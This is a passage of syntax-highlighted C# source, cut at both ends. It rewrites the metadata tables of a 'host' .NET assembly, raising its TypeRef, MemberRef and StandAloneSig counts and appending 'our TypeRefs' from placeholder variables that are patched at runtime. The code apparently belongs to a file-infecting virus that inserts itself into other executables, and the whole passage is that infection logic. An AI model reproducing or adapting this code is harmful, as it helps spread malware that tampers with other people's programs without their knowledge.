                                        </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc5">do</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc11">skip2</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">);</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">

                                            </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* save and update host TypeRefs count */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">typerefs</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* check that combined Typerefs count &lt; 32
                                           more than 31 Typerefs requires size-extending many objects
                                        */</span><span class="sc0">

                                        </span><span class="sc1">/* variable 8: number of our TypeRefs */</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">typerefs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x08626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">methods</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">skip3</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc1">/* calculate number of bytes between host Methods and MemberRefs */</span><span class="sc0">

                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">do</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">skip3</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">);</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">

                                                </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc1">/* calculate number of bytes between host MemberRefs and StandAloneSigs */</span><span class="sc0">

                                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">skip4</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">do</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">skip4</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">);</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">

                                                </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc1">/* save and update host MemberRefs count */</span><span class="sc0">

                                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">memberrefs</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc1">/* variable 9: number of our MemberRefs */</span><span class="sc0">

                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memberrefs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x09626772</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc1">/* calculate number of bytes between host StandAloneSigs and AssemblyRefs */</span><span class="sc0">

                                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">skip5</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x1b</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x18</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x15</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x12</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0a</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">do</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">skip5</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">

                                                </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x18</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">11</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">do</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">skip5</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">

                                                </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc1">/* get number of host AssemblyRefs */</span><span class="sc0">

                                            </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc1">/* skip remaining rows */</span><span class="sc0">

                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">do</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x40</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">

                                                </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc1">/* must be at least 2 AssemblyRefs */</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc1">/* save and update host StandAloneSigs count */</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">standalonesigs</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">standalonesigs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* copy up to end of host TypeRefs */</span><span class="sc0">

                                                </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">skip1</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">typerefs</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">));</span><span class="sc0">
                                                </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">trefoff</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* append our TypeRefs */</span><span class="sc0">

                                                </span><span class="sc1">/* variable 10: RVA of our TypeRefs
                                                   variable 11: size of our TypeRefs
                                                */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">(</span><span class="sc11">ourbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0a626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">trefoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0x0b626772</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* if the first two AssemblyRefs are "mscorlib" and "System", then we don't need to fix the ResolutionScope indexes */</span><span class="sc0">

                                                </span><span class="sc1">/* fix up host Name string offset, NameSpace string offset */</span><span class="sc0">

                                                </span><span class="sc1">/* variable 8: number of our TypeRefs */</span><span class="sc0">

                                                </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x08626772</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc5">do</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                                    </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stringsdelta</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0xffff0000</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">stringsdelta</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xffff</span><span class="sc10">)));</span><span class="sc0">
                                                    </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">
                                                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

